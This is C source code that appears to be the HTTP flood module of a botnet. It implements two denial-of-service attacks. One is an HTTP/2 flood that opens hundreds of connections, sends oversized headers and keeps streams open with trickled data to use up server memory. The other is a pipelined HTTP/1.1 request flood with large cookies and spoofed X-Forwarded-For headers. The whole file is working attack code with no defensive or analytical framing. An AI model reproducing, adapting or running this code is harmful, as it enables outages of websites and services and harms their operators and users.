#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <netinet/tcp.h>

#include "includes.h"
#include "attack.h"
#include "rand.h"
#include "util.h"

#define H2_MAX_FDS         512
#define H2_PREFACE         "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
#define H2_PREFACE_LEN     24

/* HTTP/2 frame types */
#define H2_FRAME_DATA      0x00
#define H2_FRAME_HEADERS   0x01
#define H2_FRAME_SETTINGS  0x04
#define H2_FRAME_WINDOW    0x08

/* HTTP/2 flags */
#define H2_FLAG_END_HEADERS 0x04

/* Build 9-byte HTTP/2 frame header */
static inline void h2_frame_hdr(uint8_t *buf, uint32_t len, uint8_t type, uint8_t flags, uint32_t sid) {
    buf[0] = (len >> 16) & 0xff;
    buf[1] = (len >> 8) & 0xff;
    buf[2] = len & 0xff;
    buf[3] = type;
    buf[4] = flags;
    buf[5] = (sid >> 24) & 0x7f;
    buf[6] = (sid >> 16) & 0xff;
    buf[7] = (sid >> 8) & 0xff;
    buf[8] = sid & 0xff;
}

/* Build SETTINGS: huge header table + window + max streams */
static int h2_build_init(uint8_t *buf) {
    int off = 0;
    /* Connection preface */
    memcpy(buf, H2_PREFACE, H2_PREFACE_LEN);
    off += H2_PREFACE_LEN;

    /* SETTINGS frame */
    uint8_t settings[] = {
        0x00,0x01, 0x00,0x01,0x00,0x00,  /* HEADER_TABLE_SIZE = 65536 (force server to allocate big dynamic table) */
        0x00,0x03, 0x00,0x00,0x03,0xe8,  /* MAX_CONCURRENT_STREAMS = 1000 */
        0x00,0x04, 0x00,0xff,0xff,0xff,  /* INITIAL_WINDOW_SIZE = 16MB */
        0x00,0x05, 0x00,0x00,0x40,0x00,  /* MAX_FRAME_SIZE = 16384 */
        0x00,0x06, 0x00,0x01,0x00,0x00,  /* MAX_HEADER_LIST_SIZE = 65536 */
    };
    h2_frame_hdr(buf + off, sizeof(settings), H2_FRAME_SETTINGS, 0, 0);
    off += 9;
    memcpy(buf + off, settings, sizeof(settings));
    off += sizeof(settings);

    /* WINDOW_UPDATE on connection (stream 0) - 1GB window */
    h2_frame_hdr(buf + off, 4, H2_FRAME_WINDOW, 0, 0);
    off += 9;
    buf[off++] = 0x3f; buf[off++] = 0xff; buf[off++] = 0xff; buf[off++] = 0xff;

    return off;
}

/* Random paths */
static const char *paths[] = {
    "/", "/index", "/api/v1/", "/search?q=", "/page/", "/static/",
    "/assets/", "/login", "/register", "/product/", "/category/",
    "/?p=", "/feed", "/sitemap.xml", "/.well-known/", "/graphql",
    "/api/data", "/user/profile", "/checkout", "/cart"
};

/* Random UAs */
static const char *uas[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Gecko/20100101",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15",
};

/*
 * Build HEADERS frame with fat headers for RAM pressure.
 * Strategy: POST method + large Cookie + large custom headers.
 * Server MUST decompress and store all these in memory per stream.
 * We do NOT close the stream -> server holds memory until timeout.
 */
static int h2_build_fat_headers(uint8_t *buf, uint32_t stream_id, const char *host, int host_len) {
    uint8_t hpack[1400];
    int hp = 0;

    /* :method POST (indexed, static table 3) */
    hpack[hp++] = 0x83;
    
    /* :scheme http (indexed, static table 6) */
    hpack[hp++] = 0x86;

    /* :path - literal indexed name=4 */
    hpack[hp++] = 0x44;
    const char *path = paths[rand_next() % (sizeof(paths)/sizeof(paths[0]))];
    char fp[128];
    int fplen = snprintf(fp, sizeof(fp), "%s%u", path, rand_next() & 0xffff);
    if (fplen > 127) fplen = 127;
    hpack[hp++] = (uint8_t)fplen;
    memcpy(hpack + hp, fp, fplen); hp += fplen;

    /* :authority (host) - literal indexed name=1 */
    hpack[hp++] = 0x41;
    hpack[hp++] = (uint8_t)host_len;
    memcpy(hpack + hp, host, host_len); hp += host_len;

    /* content-type */
    hpack[hp++] = 0x00;
    hpack[hp++] = 12;
    memcpy(hpack + hp, "content-type", 12); hp += 12;
    hpack[hp++] = 33;
    memcpy(hpack + hp, "application/x-www-form-urlencoded", 33); hp += 33;

    /* user-agent - FULL UA string (server stores this per stream) */
    hpack[hp++] = 0x00;
    hpack[hp++] = 10;
    memcpy(hpack + hp, "user-agent", 10); hp += 10;
    const char *ua = uas[rand_next() % (sizeof(uas)/sizeof(uas[0]))];
    int ualen = strlen(ua);
    hpack[hp++] = (uint8_t)ualen;
    memcpy(hpack + hp, ua, ualen); hp += ualen;

    /* === RAM BOMB HEADERS === */

    /* Giant Cookie header - server MUST parse & store entire value */
    hpack[hp++] = 0x00;
    hpack[hp++] = 6;
    memcpy(hpack + hp, "cookie", 6); hp += 6;
    /* 255 bytes of random cookie data */
    hpack[hp++] = 0x7f; /* 127 in HPACK integer encoding... use simpler: */
    /* Actually use raw length encoding. Max we can fit: */
    int cookie_len = 200;
    hpack[hp++] = (uint8_t)cookie_len;
    /* Generate random cookie key=value pairs */
    for (int c = 0; c < cookie_len; c++) {
        hpack[hp++] = 'A' + (rand_next() % 26);
    }

    /* X-Padding header - pure RAM filler, server stores it */
    hpack[hp++] = 0x00;
    hpack[hp++] = 9;
    memcpy(hpack + hp, "x-padding", 9); hp += 9;
    int pad_len = 200;
    hpack[hp++] = (uint8_t)pad_len;
    for (int p = 0; p < pad_len; p++) {
        hpack[hp++] = 'a' + (rand_next() % 26);
    }

    /* accept */
    hpack[hp++] = 0x00;
    hpack[hp++] = 6;
    memcpy(hpack + hp, "accept", 6); hp += 6;
    hpack[hp++] = 3;
    memcpy(hpack + hp, "*/*", 3); hp += 3;

    /* accept-encoding */
    hpack[hp++] = 0x00;
    hpack[hp++] = 15;
    memcpy(hpack + hp, "accept-encoding", 15); hp += 15;
    hpack[hp++] = 13;
    memcpy(hpack + hp, "gzip, deflate", 13); hp += 13;

    /* cache-control: no-cache */
    hpack[hp++] = 0x00;
    hpack[hp++] = 13;
    memcpy(hpack + hp, "cache-control", 13); hp += 13;
    hpack[hp++] = 8;
    memcpy(hpack + hp, "no-cache", 8); hp += 8;

    /* Build frame: END_HEADERS set, but NOT END_STREAM (body will follow = server waits for body) */
    h2_frame_hdr(buf, hp, H2_FRAME_HEADERS, H2_FLAG_END_HEADERS, stream_id);
    memcpy(buf + 9, hpack, hp);

    return 9 + hp;
}

/* Build small DATA frame (trickle body to keep stream alive) */
static int h2_build_data_trickle(uint8_t *buf, uint32_t stream_id) {
    /* Send 16 bytes of garbage body - keeps stream open, server waits for more */
    char body[16];
    for (int i = 0; i < 16; i++) body[i] = 'A' + (rand_next() % 26);
    
    /* flags=0 means NOT end of stream - server keeps waiting for more body data = RAM held */
    h2_frame_hdr(buf, 16, H2_FRAME_DATA, 0, stream_id);
    memcpy(buf + 9, body, 16);
    return 25;
}

/* ============================================
 * HTTP/2 RAW FLOOD - MAX RPS + RAM EXHAUSTION
 * 
 * Strategy:
 *   - Open streams with POST + fat headers (Cookie bomb, padding)
 *   - Do NOT close streams (no END_STREAM, no RST)
 *   - Server must hold state for every open stream
 *   - Trickle small DATA frames to keep streams alive
 *   - Each stream consumes ~4-16KB server RAM (headers + state + buffers)
 *   - 512 connections x 100+ streams each = massive RAM pressure
 *   - When connection drops, immediately reconnect and repeat
 * ============================================ */
void attack_http_h2(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts) {
    uint16_t port = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);

    char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
    char host[128] = {0};
    int hostlen = 0;

    if (domain != NULL && strlen(domain) > 0) {
        hostlen = snprintf(host, sizeof(host), "%s", domain);
    } else {
        struct in_addr a;
        a.s_addr = targs[0].addr;
        hostlen = snprintf(host, sizeof(host), "%s", inet_ntoa(a));
    }

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = targs[0].addr;

    /* Pre-build init sequence */
    uint8_t init_buf[512];
    int init_len = h2_build_init(init_buf);

    struct h2state {
        int fd;
        uint8_t phase;       /* 0=disc, 1=connecting, 2=sent_preface, 3=flooding, 4=trickling */
        uint32_t stream_id;
        uint32_t timeout;
        int open_streams;
        uint32_t trickle_base; /* first stream id that needs trickle */
    } st[H2_MAX_FDS];

    for (int i = 0; i < H2_MAX_FDS; i++) {
        st[i].fd = -1;
        st[i].phase = 0;
        st[i].stream_id = 1;
        st[i].open_streams = 0;
        st[i].trickle_base = 1;
    }

    int sndbuf = 1024 * 1024;
    int nodelay = 1;
    uint8_t sendbuf[8192];

    while (TRUE) {
        for (int i = 0; i < H2_MAX_FDS; i++) {
            switch (st[i].phase) {
            case 0: /* DISCONNECTED */
            {
                int fd = socket(AF_INET, SOCK_STREAM, 0);
                if (fd == -1) continue;
                fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));
                setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
                setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &nodelay, sizeof(nodelay));

                st[i].fd = fd;
                st[i].stream_id = 1;
                st[i].open_streams = 0;
                st[i].trickle_base = 1;
                errno = 0;
                connect(fd, (struct sockaddr *)&addr, sizeof(addr));
                if (errno != 0 && errno != EINPROGRESS) {
                    close(fd); st[i].fd = -1; continue;
                }
                st[i].phase = 1;
                st[i].timeout = time(NULL);
                break;
            }
            case 1: /* CONNECTING */
            {
                fd_set ws;
                FD_ZERO(&ws);
                FD_SET(st[i].fd, &ws);
                struct timeval tv = {0, 50};
                if (select(st[i].fd + 1, NULL, &ws, NULL, &tv) == 1) {
                    int e = 0; socklen_t el = sizeof(e);
                    getsockopt(st[i].fd, SOL_SOCKET, SO_ERROR, &e, &el);
                    if (e) { close(st[i].fd); st[i].fd = -1; st[i].phase = 0; continue; }

                    /* Send HTTP/2 preface + settings + window update */
                    send(st[i].fd, init_buf, init_len, MSG_NOSIGNAL);
                    st[i].phase = 2;
                    st[i].timeout = time(NULL);
                } else if ((uint32_t)time(NULL) - st[i].timeout > 5) {
                    close(st[i].fd); st[i].fd = -1; st[i].phase = 0;
                }
                break;
            }
            case 2: /* SENT PREFACE - start flooding immediately */
            {
                st[i].phase = 3;
                break;
            }
            case 3: /* FLOODING - blast HEADERS frames as fast as possible */
            {
                int total = 0;
                int batch = 0;

                /* Build batch of fat HEADERS frames */
                while (total < 7000 && batch < 16) {
                    int n = h2_build_fat_headers(sendbuf + total, st[i].stream_id, host, hostlen);
                    total += n;
                    st[i].stream_id += 2;
                    st[i].open_streams++;
                    batch++;
                }

                int sent = send(st[i].fd, sendbuf, total, MSG_NOSIGNAL);
                if (sent == -1 && errno != EAGAIN && errno != EWOULDBLOCK) {
                    close(st[i].fd); st[i].fd = -1; st[i].phase = 0; continue;
                }

                /* After opening ~100 streams, switch to trickle mode to keep them alive */
                if (st[i].open_streams >= 100) {
                    st[i].phase = 4;
                    st[i].trickle_base = 1;
                }

                /* Drain incoming (don't care about responses) */
                char drain[2048];
                recv(st[i].fd, drain, sizeof(drain), MSG_NOSIGNAL | MSG_DONTWAIT);

                /* Overflow protection */
                if (st[i].stream_id > 0x7FFFFF00) {
                    close(st[i].fd); st[i].fd = -1; st[i].phase = 0;
                }
                break;
            }
            case 4: /* TRICKLE - send small DATA frames to keep streams alive + open more */
            {
                int total = 0;

                /* Trickle data to 8 existing streams (keeps them open in server RAM) */
                for (int t = 0; t < 8 && total < 6000; t++) {
                    uint32_t tsid = st[i].trickle_base;
                    if (tsid >= st[i].stream_id) {
                        st[i].trickle_base = 1;
                        tsid = 1;
                    }
                    int n = h2_build_data_trickle(sendbuf + total, tsid);
                    total += n;
                    st[i].trickle_base += 2;
                }

                /* Also open 8 new streams (keep pressure up) */
                for (int h = 0; h < 8 && total < 7500; h++) {
                    int n = h2_build_fat_headers(sendbuf + total, st[i].stream_id, host, hostlen);
                    total += n;
                    st[i].stream_id += 2;
                    st[i].open_streams++;
                }

                int sent = send(st[i].fd, sendbuf, total, MSG_NOSIGNAL);
                if (sent == -1 && errno != EAGAIN && errno != EWOULDBLOCK) {
                    close(st[i].fd); st[i].fd = -1; st[i].phase = 0; continue;
                }

                /* Drain */
                char drain[2048];
                recv(st[i].fd, drain, sizeof(drain), MSG_NOSIGNAL | MSG_DONTWAIT);

                /* Reconnect periodically to reset and re-flood */
                if (st[i].open_streams > 500 || st[i].stream_id > 0x7FFFFF00) {
                    close(st[i].fd); st[i].fd = -1; st[i].phase = 0;
                }
                break;
            }
            }
        }
    }
}

/* ============================================
 * HTTP/1.1 RAW HIGH-RPS FLOOD
 * Pure fire-and-forget pipelined requests
 * Also uses fat headers for RAM pressure
 * ============================================ */

static const char *http1_paths[] = {
    "/", "/index", "/api/", "/search?q=", "/page/", "/static/",
    "/assets/", "/login", "/register", "/product/",
    "/?p=", "/feed", "/sitemap", "/robots.txt", "/graphql"
};

void attack_http_raw(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts) {
    uint16_t port = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);

    char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
    char host[128] = {0};
    if (domain != NULL && strlen(domain) > 0)
        snprintf(host, sizeof(host), "%s", domain);
    else {
        struct in_addr a; a.s_addr = targs[0].addr;
        snprintf(host, sizeof(host), "%s", inet_ntoa(a));
    }

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = targs[0].addr;

    int sndbuf = 1024 * 1024;
    int nodelay = 1;

    /* Pre-generate random cookie for RAM pressure */
    char fatcookie[512];
    for (int c = 0; c < 500; c++) fatcookie[c] = 'A' + (rand_next() % 26);
    fatcookie[500] = '\0';

    struct st1 {
        int fd;
        uint8_t phase;
        uint32_t timeout;
    } st[H2_MAX_FDS];

    for (int i = 0; i < H2_MAX_FDS; i++) {
        st[i].fd = -1; st[i].phase = 0;
    }

    while (TRUE) {
        for (int i = 0; i < H2_MAX_FDS; i++) {
            switch (st[i].phase) {
            case 0:
            {
                int fd = socket(AF_INET, SOCK_STREAM, 0);
                if (fd == -1) continue;
                fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));
                setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
                setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &nodelay, sizeof(nodelay));
                st[i].fd = fd;
                errno = 0;
                connect(fd, (struct sockaddr *)&addr, sizeof(addr));
                if (errno != 0 && errno != EINPROGRESS) {
                    close(fd); st[i].fd = -1; continue;
                }
                st[i].phase = 1;
                st[i].timeout = time(NULL);
                break;
            }
            case 1:
            {
                fd_set ws;
                FD_ZERO(&ws);
                FD_SET(st[i].fd, &ws);
                struct timeval tv = {0, 50};
                if (select(st[i].fd + 1, NULL, &ws, NULL, &tv) == 1) {
                    int e = 0; socklen_t el = sizeof(e);
                    getsockopt(st[i].fd, SOL_SOCKET, SO_ERROR, &e, &el);
                    if (e) { close(st[i].fd); st[i].fd = -1; st[i].phase = 0; continue; }
                    st[i].phase = 2;
                } else if ((uint32_t)time(NULL) - st[i].timeout > 5) {
                    close(st[i].fd); st[i].fd = -1; st[i].phase = 0;
                }
                break;
            }
            case 2:
            {
                /* Build 4 pipelined requests with fat cookies */
                char req[8192];
                int total = 0;
                
                for (int r = 0; r < 4 && total < 7500; r++) {
                    const char *path = http1_paths[rand_next() % (sizeof(http1_paths)/sizeof(http1_paths[0]))];
                    const char *ua = uas[rand_next() % (sizeof(uas)/sizeof(uas[0]))];
                    uint32_t rnd = rand_next();

                    /* Randomize cookie slightly each request */
                    fatcookie[rand_next() % 500] = 'A' + (rand_next() % 26);
                    fatcookie[rand_next() % 500] = '0' + (rand_next() % 10);

                    int n = snprintf(req + total, sizeof(req) - total,
                        "GET %s%u HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: %s\r\n"
                        "Accept: text/html,application/xhtml+xml,*/*;q=0.8\r\n"
                        "Accept-Language: en-US,en;q=0.9\r\n"
                        "Accept-Encoding: gzip, deflate, br\r\n"
                        "Connection: keep-alive\r\n"
                        "Cache-Control: no-cache\r\n"
                        "Pragma: no-cache\r\n"
                        "Cookie: session=%s\r\n"
                        "X-Forwarded-For: %u.%u.%u.%u\r\n"
                        "\r\n",
                        path, rnd & 0xffff,
                        host,
                        ua,
                        fatcookie,
                        (rnd >> 24) & 0xff, (rnd >> 16) & 0xff,
                        (rnd >> 8) & 0xff, rnd & 0xff
                    );
                    if (n > 0) total += n;
                }

                int sent = send(st[i].fd, req, total, MSG_NOSIGNAL);
                if (sent == -1 && errno != EAGAIN && errno != EWOULDBLOCK) {
                    close(st[i].fd); st[i].fd = -1; st[i].phase = 0; continue;
                }

                /* Drain responses */
                char drain[2048];
                recv(st[i].fd, drain, sizeof(drain), MSG_NOSIGNAL | MSG_DONTWAIT);
                break;
            }
            }
        }
    }
}
